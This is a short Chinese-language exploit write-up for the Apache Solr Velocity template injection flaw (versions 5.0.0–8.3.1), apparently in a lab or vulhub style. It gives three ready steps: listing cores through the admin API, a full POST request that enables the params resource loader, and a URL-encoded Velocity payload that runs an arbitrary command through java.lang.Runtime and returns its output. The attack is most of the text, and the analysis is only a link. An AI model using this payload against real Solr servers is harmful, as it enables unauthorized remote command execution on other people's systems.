

## 漏洞概述

攻击者通过未授权访问solr服务器，可以注入自定义模板，通过Velocity模板语言执行任意命令

发送特定的数据包开启 `params.resource.loader.enabled`，然后get访问接口执行命令

## 影响范围

```http
5.0.0 ~ 8.3.1版本
```

## 漏洞利用

1、默认情况下`params.resource.loader.enabled`配置未打开，无法使用自定义模板

我们先通过如下API获取所有的核心：

```http
http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json
```

2、通过如下请求开启`params.resource.loader.enabled`，其中API路径包含刚才获取的core名称

```http
POST /solr/demo/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

3、之后，注入Velocity模板即可执行任意命令

```http
http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

## 漏洞分析

https://xz.aliyun.com/t/6700#toc-4